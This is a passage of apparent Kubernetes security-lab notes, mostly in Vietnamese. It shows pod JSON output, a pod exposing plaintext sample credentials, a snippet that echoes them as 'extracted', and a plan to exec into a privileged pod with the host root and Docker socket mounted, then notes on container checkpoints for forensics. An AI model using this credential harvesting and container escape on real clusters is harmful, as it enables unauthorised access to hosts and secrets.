3600"],"resources":{},"volumeMounts":[{"name":"kube-api-access-k28j2","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Always","securityContext":{"capabilities":{"drop":["ALL"]},"allowPrivilegeEscalation":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"default","serviceAccount":"default","nodeName":"longth-cluster","securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"PodReadyToStartContainers","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:48:19Z"},{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:48:16Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:48:19Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:48:19Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2026-03-30T03:48:16Z"}],"hostIP":"192.168.213.128","hostIPs":[{"ip":"192.168.213.128"}],"podIP":"10.244.0.196","podIPs":[{"ip":"10.244.0.196"}],"startTime":"2026-03-30T03:48:16Z","containerStatuses":[{"name":"shell","state":{"running":{"startedAt":"2026-03-30T03:48:19Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"docker.io/library/alpine:latest","imageID":"docker.io/library/alpine@sha256:25109184c71bdad752c8312a8623239686a9a2071e8825f20acb8f2198c3f659","containerID":"containerd://d851e39996b02ff61ca6bd1fbdea8a99f87c2e0c71c1367fd6436fb20c4d2898","started":true,"volumeMounts":[{"name":"kube-api-access-k28j2","mountPath":"/var/run/secrets/kubernetes.io/serviceaccount","readOnly":true,"recursiveReadOnly":"Disabled"}]}],"qosClass":"BestEffort"}}]}
(base) jovyan@jupyter-lab-6694c6bcfd-j44tb:/tmp/longth$ 
```

```jsx

```

**Pod `longth2-test` trong namespace `default`**

```jsx
"env":[
  {"name":"DB_PASSWORD","value":"SuperSecretPassword123!"},
  {"name":"API_KEY","value":"sk-1234567890abcdef"},
  {"name":"AWS_SECRET_ACCESS_KEY","value":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},
  {"name":"MYSQL_ROOT_PASSWORD","value":"root123"},
  {"name":"REDIS_PASSWORD","value":"redis_secret_123"},
  {"name":"ADMIN_TOKEN","value":"admin_token_super_secret"}
]
```

**Pod này còn có:**

```jsx
"securityContext":{"privileged":true},
"hostNetwork":true,"hostPID":true,"hostIPC":true,
"volumeMounts":[{"mountPath":"/host","name":"host-root"},
                {"mountPath":"/var/run/docker.sock","name":"docker-socket"}]
```

**Extract credentials từ output** 

```jsx
AWS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
API_KEY="sk-1234567890abcdef"
ADMIN_TOKEN="admin_token_super_secret"
DB_PASS="SuperSecretPassword123!"

echo "[✓] Credentials extracted:"
echo "  AWS_SECRET_ACCESS_KEY: ${AWS_KEY}"
echo "  API_KEY: ${API_KEY}"
echo "  ADMIN_TOKEN: ${ADMIN_TOKEN}"
```

### **Exec vào pod `longth2-test` để access host filesystem**

Pod này đã có sẵn `hostPath: /` mount tại `/host` + `privileged: true`.

# Forensic

**dump container ra `.tar` để DFIR”** chính là dùng **container checkpoint**.

Cụ thể:

- bạn **không tar thủ công rootfs đang live**
- mà gọi **checkpoint** của Kubernetes/CRI
- kết quả là kubelet/runtime tạo ra **một file checkpoint `.tar`**
- file này chứa trạng thái cần cho forensic như memory/process/filesystem diff tùy runtime và nội dung checkpoint
- sau đó bạn **copy file `.tar` đó sang `/Auto_DFIR`**

cần cài criu / checkpoint
